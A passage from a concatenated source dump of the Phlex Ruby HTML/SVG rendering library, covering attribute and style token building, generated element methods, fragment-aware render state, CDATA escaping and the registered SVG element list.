601 | 			end
602 |
603 | 			if root_key
604 | 				base_name = original_base_name
605 | 			end
606 |
607 | 			buffer
608 | 		end
609 | 	end
610 |
611 | 	private def __nested_tokens__(tokens, sep = " ")
612 | 		buffer = +""
613 |
614 | 		i, length = 0, tokens.length
615 |
616 | 		while i < length
617 | 			token = tokens[i]
618 |
619 | 			case token
620 | 			when String
621 | 				if i > 0
622 | 					buffer << sep << token
623 | 				else
624 | 					buffer << token
625 | 				end
626 | 			when Symbol
627 | 				if i > 0
628 | 					buffer << sep << token.name.tr("_", "-")
629 | 				else
630 | 					buffer << token.name.tr("_", "-")
631 | 				end
632 | 			when Integer, Float, Phlex::SGML::SafeObject
633 | 				if i > 0
634 | 					buffer << sep << token.to_s
635 | 				else
636 | 					buffer << token.to_s
637 | 				end
638 | 			when Array
639 | 				if token.length > 0
640 | 					if i > 0
641 | 						buffer << sep << __nested_tokens__(token, sep)
642 | 					else
643 | 						buffer << __nested_tokens__(token, sep)
644 | 					end
645 | 				end
646 | 			when nil
647 | 				# Do nothing
648 | 			else
649 | 				raise Phlex::ArgumentError.new("Invalid token type: #{token.class}.")
650 | 			end
651 |
652 | 			i += 1
653 | 		end
654 |
655 | 		buffer.gsub('"', "&quot;")
656 | 	end
657 |
658 | 	# Result is **unsafe**, so it should be escaped!
659 | 	private def __styles__(styles)
660 | 		case styles
661 | 		when Array, Set
662 | 			styles.filter_map do |s|
663 | 				case s
664 | 				when String
665 | 					if s == "" || s.end_with?(";")
666 | 						s
667 | 					else
668 | 						"#{s};"
669 | 					end
670 | 				when Phlex::SGML::SafeObject
671 | 					value = s.to_s
672 | 					value.end_with?(";") ? value : "#{value};"
673 | 				when Hash
674 | 					next __styles__(s)
675 | 				when nil
676 | 					next nil
677 | 				else
678 | 					raise Phlex::ArgumentError.new("Invalid style: #{s.inspect}.")
679 | 				end
680 | 			end.join(" ")
681 | 		when Hash
682 | 			buffer = +""
683 | 			i = 0
684 | 			styles.each do |k, v|
685 | 				prop = case k
686 | 				when String
687 | 					k
688 | 				when Symbol
689 | 					k.name.tr("_", "-")
690 | 				else
691 | 					raise Phlex::ArgumentError.new("Style keys should be Strings or Symbols.")
692 | 				end
693 |
694 | 				value = case v
695 | 				when String
696 | 					v
697 | 				when Symbol
698 | 					v.name.tr("_", "-")
699 | 				when Integer, Float, Phlex::SGML::SafeObject
700 | 					v.to_s
701 | 				when nil
702 | 					nil
703 | 				else
704 | 					raise Phlex::ArgumentError.new("Invalid style value: #{v.inspect}")
705 | 				end
706 |
707 | 				if value
708 | 					if i == 0
709 | 						buffer << prop << ": " << value << ";"
710 | 					else
711 | 						buffer << " " << prop << ": " << value << ";"
712 | 					end
713 | 				end
714 |
715 | 				i += 1
716 | 			end
717 |
718 | 			buffer
719 | 		end
720 | 	end
721 |
722 | 	private_class_method def self.method_added(method_name)
723 | 		if method_name == :view_template
724 | 			location = instance_method(method_name).source_location[0]
725 |
726 | 			if location[0] in "/" | "."
727 | 				Phlex.__expand_attribute_cache__(location)
728 | 			end
729 | 		else
730 | 			super
731 | 		end
732 | 	end
733 | end
734 |


--------------------------------------------------------------------------------
/lib/phlex/sgml/elements.rb:
--------------------------------------------------------------------------------
  1 | # frozen_string_literal: true
  2 |
  3 | module Phlex::SGML::Elements
  4 | 	COMMA_SEPARATED_TOKENS = {
  5 | 		img: <<~RUBY,
  6 | 			if Array === (srcset_attribute = attributes[:srcset])
  7 | 				attributes[:srcset] = __nested_tokens__(srcset_attribute, ", ")
  8 | 			end
  9 | 		RUBY
 10 | 		link: <<~RUBY,
 11 | 			if Array === (media_attribute = attributes[:media])
 12 | 				attributes[:media] = __nested_tokens__(media_attribute, ", ")
 13 | 			end
 14 |
 15 | 			if Array === (sizes_attribute = attributes[:sizes])
 16 | 				attributes[:sizes] = __nested_tokens__(sizes_attribute, ", ")
 17 | 			end
 18 |
 19 | 			if Array === (imagesrcset_attribute = attributes[:imagesrcset])
 20 | 				rel_attribute = attributes[:rel] || attributes["rel"]
 21 | 				as_attribute = attributes[:as] || attributes["as"]
 22 |
 23 | 				if ("preload" == rel_attribute || :preload == rel_attribute) && ("image" == as_attribute || :image == as_attribute)
 24 | 					attributes[:imagesrcset] = __nested_tokens__(imagesrcset_attribute, ", ")
 25 | 				end
 26 | 			end
 27 | 		RUBY
 28 | 		input: <<~RUBY,
 29 | 			if Array === (accept_attribute = attributes[:accept])
 30 | 				type_attribute = attributes[:type] || attributes["type"]
 31 |
 32 | 				if "file" == type_attribute || :file == type_attribute
 33 | 					attributes[:accept] = __nested_tokens__(accept_attribute, ", ")
 34 | 				end
 35 | 			end
 36 | 		RUBY
 37 | 	}.freeze
 38 |
 39 | 	def __registered_elements__
 40 | 		@__registered_elements__ ||= {}
 41 | 	end
 42 |
 43 | 	def register_element(method_name, tag: method_name.name.tr("_", "-"))
 44 | 		class_eval(<<~RUBY, __FILE__, __LINE__ + 1)
 45 | 			# frozen_string_literal: true
 46 |
 47 | 			def #{method_name}(**attributes)
 48 | 				state = @_state
 49 | 				buffer = state.buffer
 50 | 				block_given = block_given?
 51 |
 52 | 				unless state.should_render?
 53 | 					yield(self) if block_given
 54 | 					return nil
 55 | 				end
 56 |
 57 | 				if attributes.length > 0 # with attributes
 58 | 					if block_given # with content block
 59 | 						buffer << "<#{tag}"
 60 | 						begin
 61 | 							#{COMMA_SEPARATED_TOKENS[method_name]}
 62 | 							buffer << (Phlex::ATTRIBUTE_CACHE[attributes] ||= __attributes__(attributes))
 63 | 						ensure
 64 | 							buffer << ">"
 65 | 						end
 66 |
 67 | 						begin
 68 | 							original_length = buffer.bytesize
 69 | 							content = yield(self)
 70 | 							if original_length == buffer.bytesize
 71 | 								case content
 72 | 								when ::Phlex::SGML::SafeObject
 73 | 									buffer << content.to_s
 74 | 								when String
 75 | 									buffer << ::Phlex::Escape.html_escape(content)
 76 | 								when Symbol
 77 | 									buffer << ::Phlex::Escape.html_escape(content.name)
 78 | 								when nil
 79 | 									nil
 80 | 								else
 81 | 									if (formatted_object = format_object(content))
 82 | 										buffer << ::Phlex::Escape.html_escape(formatted_object)
 83 | 									end
 84 | 								end
 85 | 							end
 86 | 						ensure
 87 | 							buffer << "</#{tag}>"
 88 | 						end
 89 | 					else # without content
 90 | 						buffer << "<#{tag}"
 91 | 						begin
 92 | 							#{COMMA_SEPARATED_TOKENS[method_name]}
 93 | 							buffer << (::Phlex::ATTRIBUTE_CACHE[attributes] ||= __attributes__(attributes))
 94 | 						ensure
 95 | 							buffer << "></#{tag}>"
 96 | 						end
 97 | 					end
 98 | 				else # without attributes
 99 | 					if block_given # with content block
100 | 						buffer << "<#{tag}>"
101 |
102 | 						begin
103 | 							original_length = buffer.bytesize
104 | 							content = yield(self)
105 | 							if original_length == buffer.bytesize
106 | 								case content
107 | 								when ::Phlex::SGML::SafeObject
108 | 									buffer << content.to_s
109 | 								when String
110 | 									buffer << ::Phlex::Escape.html_escape(content)
111 | 								when Symbol
112 | 									buffer << ::Phlex::Escape.html_escape(content.name)
113 | 								when nil
114 | 									nil
115 | 								else
116 | 									if (formatted_object = format_object(content))
117 | 										buffer << ::Phlex::Escape.html_escape(formatted_object)
118 | 									end
119 | 								end
120 | 							end
121 | 						ensure
122 | 							buffer << "</#{tag}>"
123 | 						end
124 | 					else # without content
125 | 						buffer << "<#{tag}></#{tag}>"
126 | 					end
127 | 				end
128 |
129 | 				#{'flush' if tag == 'head'}
130 |
131 | 				nil
132 | 			end
133 | 		RUBY
134 |
135 | 		__registered_elements__[method_name] = tag
136 |
137 | 		method_name
138 | 	end
139 |
140 | 	def __register_void_element__(method_name, tag: method_name.name.tr("_", "-"))
141 | 		class_eval(<<~RUBY, __FILE__, __LINE__ + 1)
142 | 			# frozen_string_literal: true
143 |
144 | 			def #{method_name}(**attributes)
145 | 				state = @_state
146 |
147 | 				return unless state.should_render?
148 |
149 | 				buffer = state.buffer
150 |
151 | 				if attributes.length > 0 # with attributes
152 | 					buffer << "<#{tag}"
153 | 					begin
154 | 						#{COMMA_SEPARATED_TOKENS[method_name]}
155 | 						buffer << (::Phlex::ATTRIBUTE_CACHE[attributes] ||= __attributes__(attributes))
156 | 					ensure
157 | 						buffer << ">"
158 | 					end
159 | 				else # without attributes
160 | 					buffer << "<#{tag}>"
161 | 				end
162 |
163 | 				nil
164 | 			end
165 | 		RUBY
166 |
167 | 		__registered_elements__[method_name] = tag
168 |
169 | 		method_name
170 | 	end
171 | end
172 |


--------------------------------------------------------------------------------
/lib/phlex/sgml/safe_object.rb:
--------------------------------------------------------------------------------
1 | # frozen_string_literal: true
2 |
3 | # @api private
4 | module Phlex::SGML::SafeObject
5 | 	# This is included in objects that are safe to render in an SGML context.
6 | 	# They must implement a `to_s` method that returns a string.
7 | end
8 |


--------------------------------------------------------------------------------
/lib/phlex/sgml/safe_value.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | class Phlex::SGML::SafeValue
 4 | 	include Phlex::SGML::SafeObject
 5 |
 6 | 	def initialize(to_s)
 7 | 		@to_s = to_s
 8 | 	end
 9 |
10 | 	attr_reader :to_s
11 | end
12 |


--------------------------------------------------------------------------------
/lib/phlex/sgml/state.rb:
--------------------------------------------------------------------------------
  1 | # frozen_string_literal: true
  2 |
  3 | class Phlex::SGML::State
  4 | 	def initialize(user_context: {}, output_buffer:, fragments:)
  5 | 		@buffer = +""
  6 | 		@capturing = false
  7 | 		@user_context = user_context
  8 | 		@fragments = fragments
  9 | 		@fragment_depth = 0
 10 | 		@cache_stack = []
 11 | 		@halt_signal = nil
 12 | 		@output_buffer = output_buffer
 13 | 	end
 14 |
 15 | 	attr_accessor :capturing, :user_context
 16 |
 17 | 	attr_reader :fragments, :fragment_depth, :output_buffer, :buffer
 18 |
 19 | 	def around_render(component)
 20 | 		stack = @stack
 21 |
 22 | 		if !@fragments || @halt_signal
 23 | 			yield
 24 | 		else
 25 | 			catch do |signal|
 26 | 				@halt_signal = signal
 27 | 				yield
 28 | 			end
 29 | 		end
 30 | 	end
 31 |
 32 | 	def should_render?
 33 | 		!@fragments || @fragment_depth > 0
 34 | 	end
 35 |
 36 | 	def begin_fragment(id)
 37 | 		@fragment_depth += 1 if @fragments&.include?(id)
 38 |
 39 | 		if caching?
 40 | 			current_byte_offset = 0                                 		# Start tracking the byte offset of this fragment from the start of the cache buffer
 41 | 			@cache_stack.reverse_each do |(cache_buffer, fragment_map)| # We'll iterate deepest to shallowest
 42 | 				current_byte_offset += cache_buffer.bytesize		      		# Add the length of the cache buffer to the current byte offset
 43 | 				fragment_map[id] = [current_byte_offset, nil, []]     		# Record the byte offset, length, and store a list of the nested fragments
 44 |
 45 | 				fragment_map.each do |name, (_offset, length, nested_fragments)| # Iterate over the other fragments
 46 | 					next if name == id || length                       						 # Skip if it's the current fragment, or if the fragment has already ended
 47 | 					nested_fragments << id                                       	 # Add the current fragment to the list of nested fragments
 48 | 				end
 49 | 			end
 50 | 		end
 51 | 	end
 52 |
 53 | 	def end_fragment(id)
 54 | 		if caching?
 55 | 			byte_length = nil
 56 | 			@cache_stack.reverse_each do |(cache_buffer, fragment_map)|   # We'll iterate deepest to shallowest
 57 | 				byte_length ||= cache_buffer.bytesize - fragment_map[id][0] # The byte length is the difference between the current byte offset and the byte offset of the fragment
 58 | 				fragment_map[id][1] = byte_length                           # All cache contexts will use the same by
 59 | 			end
 60 | 		end
 61 |
 62 | 		return unless @fragments&.include?(id)
 63 |
 64 | 		@fragments.delete(id)
 65 | 		@fragment_depth -= 1
 66 | 		throw @halt_signal if @fragments.length == 0
 67 | 	end
 68 |
 69 | 	def record_fragment(id, offset, length, nested_fragments)
 70 | 		return unless caching?
 71 |
 72 | 		@cache_stack.reverse_each do |(cache_buffer, fragment_map)|
 73 | 			offset += cache_buffer.bytesize
 74 | 			fragment_map[id] = [offset, length, nested_fragments]
 75 | 		end
 76 | 	end
 77 |
 78 | 	def caching(&)
 79 | 		result = nil
 80 |
 81 | 		capture do
 82 | 			@cache_stack.push([buffer, {}].freeze)
 83 | 			yield
 84 | 			result = @cache_stack.pop
 85 | 		end
 86 |
 87 | 		result
 88 | 	end
 89 |
 90 | 	def caching?
 91 | 		@cache_stack.length > 0
 92 | 	end
 93 |
 94 | 	def capture
 95 | 		new_buffer = +""
 96 | 		original_buffer = @buffer
 97 | 		original_capturing = @capturing
 98 | 		original_fragments = @fragments
 99 |
100 | 		begin
101 | 			@buffer = new_buffer
102 | 			@capturing = true
103 | 			@fragments = nil
104 | 			yield
105 | 		ensure
106 | 			@buffer = original_buffer
107 | 			@capturing = original_capturing
108 | 			@fragments = original_fragments
109 | 		end
110 |
111 | 		new_buffer
112 | 	end
113 |
114 | 	def flush
115 | 		return if capturing
116 |
117 | 		buffer = @buffer
118 | 		@output_buffer << buffer.dup
119 |
120 | 		buffer.clear
121 | 		nil
122 | 	end
123 | end
124 |


--------------------------------------------------------------------------------
/lib/phlex/svg.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | class Phlex::SVG < Phlex::SGML
 4 | 	include StandardElements
 5 |
 6 | 	# Returns the string "image/svg+xml"
 7 | 	def content_type
 8 | 		"image/svg+xml"
 9 | 	end
10 |
11 | 	# Override to provide a filename for the SVG file
12 | 	def filename
13 | 		nil
14 | 	end
15 |
16 | 	def cdata(content = nil, &block)
17 | 		state = @_state
18 | 		return unless state.should_render?
19 |
20 | 		if !block && String === content
21 | 			state.buffer << "<![CDATA[" << content.gsub("]]>", "]]>]]<![CDATA[") << "]]>"
22 | 		elsif block && nil == content
23 | 			state.buffer << "<![CDATA[" << capture(&block).gsub("]]>", "]]>]]<![CDATA[") << "]]>"
24 | 		else
25 |
26 | 			raise Phlex::ArgumentError.new("Expected a String or block.")
27 | 		end
28 | 	end
29 |
30 | 	def tag(name, **attributes, &)
31 | 		state = @_state
32 | 		block_given = block_given?
33 | 		buffer = state.buffer
34 |
35 | 		unless state.should_render?
36 | 			yield(self) if block_given
37 | 			return nil
38 | 		end
39 |
40 | 		unless Symbol === name
41 | 			raise Phlex::ArgumentError.new("Expected the tag name to be a Symbol.")
42 | 		end
43 |
44 | 		if (tag = StandardElements.__registered_elements__[name]) || (tag = name.name.tr("_", "-")).include?("-")
45 | 			if attributes.length > 0 # with attributes
46 | 				if block_given # with content block
47 | 					buffer << "<#{tag}" << (Phlex::ATTRIBUTE_CACHE[attributes] ||= __attributes__(attributes)) << ">"
48 | 					__yield_content__(&)
49 | 					buffer << "</#{tag}>"
50 | 				else # without content
51 | 					buffer << "<#{tag}" << (::Phlex::ATTRIBUTE_CACHE[attributes] ||= __attributes__(attributes)) << "></#{tag}>"
52 | 				end
53 | 			else # without attributes
54 | 				if block_given # with content block
55 | 					buffer << ("<#{tag}>")
56 | 					__yield_content__(&)
57 | 					buffer << "</#{tag}>"
58 | 				else # without content
59 | 					buffer << "<#{tag}></#{tag}>"
60 | 				end
61 | 			end
62 | 		else
63 | 			raise Phlex::ArgumentError.new("Invalid SVG tag: #{name}")
64 | 		end
65 | 	end
66 | end
67 |


--------------------------------------------------------------------------------
/lib/phlex/svg/standard_elements.rb:
--------------------------------------------------------------------------------
  1 | # frozen_string_literal: true
  2 |
  3 | module Phlex::SVG::StandardElements
  4 | 	extend Phlex::SGML::Elements
  5 |
  6 | 	# Outputs an `<a>` tag.
  7 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/a
  8 | 	register_element def a(
  9 | 		download: nil,
 10 | 		href: nil,
 11 | 		hreflang: nil,
 12 | 		ping: nil,
 13 | 		referrerpolicy: nil,
 14 | 		rel: nil,
 15 | 		target: nil,
 16 | 		type: nil,
 17 | 		**attributes,
 18 | 		&content
 19 | 	) = nil
 20 | 	# Outputs an `<animate>` tag.
 21 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/animate
 22 | 	register_element def animate(
 23 | 		attributeName: nil,
 24 | 		values: nil,
 25 | 		dur: nil,
 26 | 		repeatCount: nil,
 27 | 		**attributes,
 28 | 		&content
 29 | 	) = nil
 30 | 	# Outputs an `<animateMotion>` tag.
 31 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/animateMotion
 32 | 	register_element def animateMotion(
 33 | 		keyPoints: nil,
 34 | 		path: nil,
 35 | 		rotate: nil,
 36 | 		begin: nil,
 37 | 		dur: nil,
 38 | 		end: nil,
 39 | 		repeatCount: nil,
 40 | 		repeatDur: nil,
 41 | 		fill: nil,
 42 | 		calcMode: nil,
 43 | 		values: nil,
 44 | 		keyTimes: nil,
 45 | 		keySplines: nil,
 46 | 		from: nil,
 47 | 		to: nil,
 48 | 		by: nil,
 49 | 		attributeName: nil,
 50 | 		additive: nil,
 51 | 		accumulate: nil,
 52 | 		**attributes,
 53 | 		&content
 54 | 	) = nil
 55 | 	# Outputs an `<animateTransform>` tag.
 56 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/animateTransform
 57 | 	register_element def animateTransform(
 58 | 		**attributes,
 59 | 		&content
 60 | 	) = nil
 61 | 	# Outputs a `<circle>` tag.
 62 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/circle
 63 | 	register_element def circle(
 64 | 		**attributes,
 65 | 		&content
 66 | 	) = nil
 67 | 	# Outputs a `<clipPath>` tag.
 68 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/clipPath
 69 | 	register_element def clipPath(
 70 | 		**attributes,
 71 | 		&content
 72 | 	) = nil
 73 | 	# Outputs a `<defs>` tag.
 74 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/defs
 75 | 	register_element def defs(
 76 | 		**attributes,
 77 | 		&content
 78 | 	) = nil
 79 | 	# Outputs a `<desc>` tag.
 80 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/desc
 81 | 	register_element def desc(
 82 | 		**attributes,
 83 | 		&content
 84 | 	) = nil
 85 | 	# Outputs a `<discard>` tag.
 86 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/discard
 87 | 	register_element def discard(
 88 | 		**attributes,
 89 | 		&content
 90 | 	) = nil
 91 | 	# Outputs an `<ellipse>` tag.
 92 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/ellipse
 93 | 	register_element def ellipse(
 94 | 		**attributes,
 95 | 		&content
 96 | 	) = nil
 97 | 	# Outputs an `<feBlend>` tag.
 98 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feBlend
 99 | 	register_element def feBlend(
100 | 		**attributes,
101 | 		&content
102 | 	) = nil
103 | 	# Outputs an `<feColorMatrix>` tag.
104 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feColorMatrix
105 | 	register_element def feColorMatrix(
106 | 		**attributes,
107 | 		&content
108 | 	) = nil
109 | 	# Outputs an `<feComponentTransfer>` tag.
110 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feComponentTransfer
111 | 	register_element def feComponentTransfer(
112 | 		**attributes,
113 | 		&content
114 | 	) = nil
115 | 	# Outputs an `<feComposite>` tag.
116 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feComposite
117 | 	register_element def feComposite(
118 | 		**attributes,
119 | 		&content
120 | 	) = nil
121 | 	# Outputs an `<feConvolveMatrix>` tag.
122 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feConvolveMatrix
123 | 	register_element def feConvolveMatrix(
124 | 		**attributes,
125 | 		&content
126 | 	) = nil
127 | 	# Outputs an `<feDiffuseLighting>` tag.
128 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feDiffuseLighting
129 | 	register_element def feDiffuseLighting(
130 | 		**attributes,
131 | 		&content
132 | 	) = nil
133 | 	# Outputs an `<feDisplacementMap>` tag.
134 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feDisplacementMap
135 | 	register_element def feDisplacementMap(
136 | 		**attributes,
137 | 		&content
138 | 	) = nil
139 | 	# Outputs an `<feDistantLight>` tag.
140 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feDistantLight
141 | 	register_element def feDistantLight(
142 | 		**attributes,
143 | 		&content
144 | 	) = nil
145 | 	# Outputs an `<feDropShadow>` tag.
146 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feDropShadow
147 | 	register_element def feDropShadow(
148 | 		**attributes,
149 | 		&content
150 | 	) = nil
151 | 	# Outputs an `<feFlood>` tag.
152 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feFlood
153 | 	register_element def feFlood(
154 | 		**attributes,
155 | 		&content
156 | 	) = nil
157 | 	# Outputs an `<feFuncA>` tag.
158 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feFuncA
159 | 	register_element def feFuncA(
160 | 		**attributes,
161 | 		&content
162 | 	) = nil
163 | 	# Outputs an `<feFuncB>` tag.
164 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feFuncB
165 | 	register_element def feFuncB(
166 | 		**attributes,
167 | 		&content
168 | 	) = nil
169 | 	# Outputs an `<feFuncG>` tag.
170 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feFuncG
171 | 	register_element def feFuncG(
172 | 		**attributes,
173 | 		&content
174 | 	) = nil
175 | 	# Outputs an `<feFuncR>` tag.
176 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feFuncR
177 | 	register_element def feFuncR(
178 | 		**attributes,
179 | 		&content
180 | 	) = nil
181 | 	# Outputs an `<feGaussianBlur>` tag.
182 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feGaussianBlur
183 | 	register_element def feGaussianBlur(
184 | 		**attributes,
185 | 		&content
186 | 	) = nil
187 | 	# Outputs an `<feImage>` tag.
188 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feImage
189 | 	register_element def feImage(
190 | 		**attributes,
191 | 		&content
192 | 	) = nil
193 | 	# Outputs an `<feMerge>` tag.
194 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feMerge
195 | 	register_element def feMerge(
196 | 		**attributes,
197 | 		&content
198 | 	) = nil
199 | 	# Outputs an `<feMergeNode>` tag.
200 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feMergeNode
201 | 	register_element def feMergeNode(
202 | 		**attributes,
203 | 		&content
204 | 	) = nil
205 | 	# Outputs an `<feMorphology>` tag.
206 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feMorphology
207 | 	register_element def feMorphology(
208 | 		**attributes,
209 | 		&content
210 | 	) = nil
211 | 	# Outputs an `<feOffset>` tag.
212 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feOffset
213 | 	register_element def feOffset(
214 | 		**attributes,
215 | 		&content
216 | 	) = nil
217 | 	# Outputs an `<fePointLight>` tag.
218 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/fePointLight
219 | 	register_element def fePointLight(
220 | 		**attributes,
221 | 		&content
222 | 	) = nil
223 | 	# Outputs an `<feSpecularLighting>` tag.
224 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feSpecularLighting
225 | 	register_element def feSpecularLighting(
226 | 		**attributes,
227 | 		&content
228 | 	) = nil
229 | 	# Outputs an `<feSpotLight>` tag.
230 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feSpotLight
231 | 	register_element def feSpotLight(
232 | 		**attributes,
233 | 		&content
234 | 	) = nil
235 | 	# Outputs an `<feTile>` tag.
236 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feTile
237 | 	register_element def feTile(
238 | 		**attributes,
239 | 		&content
240 | 	) = nil
241 | 	# Outputs an `<feTurbulence>` tag.
242 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/feTurbulence
243 | 	register_element def feTurbulence(
244 | 		**attributes,
245 | 		&content
246 | 	) = nil
247 | 	# Outputs a `<filter>` tag.
248 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/filter
249 | 	register_element def filter(
250 | 		**attributes,
251 | 		&content
252 | 	) = nil
253 | 	# Outputs a `<foreignObject>` tag.
254 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/foreignObject
255 | 	register_element def foreignObject(
256 | 		**attributes,
257 | 		&content
258 | 	) = nil
259 | 	# Outputs a `<g>` tag.
260 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/g
261 | 	register_element def g(
262 | 		**attributes,
263 | 		&content
264 | 	) = nil
265 | 	# Outputs an `<image>` tag.
266 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/image
267 | 	register_element def image(
268 | 		**attributes,
269 | 		&content
270 | 	) = nil
271 | 	# Outputs a `<line>` tag.
272 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/line
273 | 	register_element def line(
274 | 		**attributes,
275 | 		&content
276 | 	) = nil
277 | 	# Outputs a `<linearGradient>` tag.
278 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/linearGradient
279 | 	register_element def linearGradient(
280 | 		**attributes,
281 | 		&content
282 | 	) = nil
283 | 	# Outputs a `<marker>` tag.
284 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/marker
285 | 	register_element def marker(
286 | 		**attributes,
287 | 		&content
288 | 	) = nil
289 | 	# Outputs a `<mask>` tag.
290 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/mask
291 | 	register_element def mask(
292 | 		**attributes,
293 | 		&content
294 | 	) = nil
295 | 	# Outputs a `<metadata>` tag.
296 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/metadata
297 | 	register_element def metadata(
298 | 		**attributes,
299 | 		&content
300 | 	) = nil
301 | 	# Outputs an `<mpath>` tag.
302 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/mpath
303 | 	register_element def mpath(
304 | 		**attributes,
305 | 		&content
306 | 	) = nil
307 | 	# Outputs a `<path>` tag.
308 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/path
309 | 	register_element def path(
310 | 		**attributes,
311 | 		&content
312 | 	) = nil
313 | 	# Outputs a `<pattern>` tag.
314 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/pattern
315 | 	register_element def pattern(
316 | 		**attributes,
317 | 		&content
318 | 	) = nil
319 | 	# Outputs a `<polygon>` tag.
320 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/polygon
321 | 	register_element def polygon(
322 | 		**attributes,
323 | 		&content
324 | 	) = nil
325 | 	# Outputs a `<polyline>` tag.
326 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/polyline
327 | 	register_element def polyline(
328 | 		**attributes,
329 | 		&content
330 | 	) = nil
331 | 	# Outputs a `<radialGradient>` tag.
332 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/radialGradient
333 | 	register_element def radialGradient(
334 | 		**attributes,
335 | 		&content
336 | 	) = nil
337 | 	# Outputs a `<rect>` tag.
338 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/rect
339 | 	register_element def rect(
340 | 		**attributes,
341 | 		&content
342 | 	) = nil
343 | 	# Outputs a `<script>` tag.
344 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/script
345 | 	register_element def script(
346 | 		**attributes,
347 | 		&content
348 | 	) = nil
349 | 	# Outputs a `<set>` tag.
350 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/set
351 | 	register_element def set(
352 | 		**attributes,
353 | 		&content
354 | 	) = nil
355 | 	# Outputs a `<stop>` tag.
356 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/stop
357 | 	register_element def stop(
358 | 		**attributes,
359 | 		&content
360 | 	) = nil
361 | 	# Outputs a `<style>` tag.
362 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/style
363 | 	register_element def style(
364 | 		**attributes,
365 | 		&content
366 | 	) = nil
367 | 	# Outputs an `<svg>` tag.
368 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/svg
369 | 	register_element def svg(
370 | 		**attributes,
371 | 		&content
372 | 	) = nil
373 | 	# Outputs a `<switch>` tag.
374 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/switch
375 | 	register_element def switch(
376 | 		**attributes,
377 | 		&content
378 | 	) = nil
379 | 	# Outputs a `<symbol>` tag.
380 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/symbol
381 | 	register_element def symbol(
382 | 		**attributes,
383 | 		&content
384 | 	) = nil
385 | 	# Outputs a `<text>` tag.
386 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/text
387 | 	register_element def text(
388 | 		**attributes,
389 | 		&content
390 | 	) = nil
391 | 	# Outputs a `<textPath>` tag.
392 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/textPath
393 | 	register_element def textPath(
394 | 		**attributes,
395 | 		&content
396 | 	) = nil
397 | 	# Outputs a `<title>` tag.
398 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/title
399 | 	register_element def title(
400 | 		**attributes,
401 | 		&content
402 | 	) = nil
403 | 	# Outputs a `<tspan>` tag.
404 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/tspan
405 | 	register_element def tspan(
406 | 		**attributes,
407 | 		&content
408 | 	) = nil
409 | 	# Outputs a `<use>` tag.
410 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/use
411 | 	register_element def use(
412 | 		**attributes,
413 | 		&content
414 | 	) = nil
415 | 	# Outputs a `<view>` tag.
416 | 	# See https://developer.mozilla.org/docs/Web/SVG/Element/view
417 | 	register_element def view(
418 | 		**attributes,
419 | 		&content
420 | 	) = nil
421 | end
422 |


--------------------------------------------------------------------------------
/lib/phlex/version.rb:
--------------------------------------------------------------------------------
1 | # frozen_string_literal: true
2 |
3 | module Phlex
4 | 	VERSION = "2.3.0"
5 | end
6 |


--------------------------------------------------------------------------------
/mise.toml:
--------------------------------------------------------------------------------
 1 | [tasks.setup]
 2 | description = "Install all project dependencies."
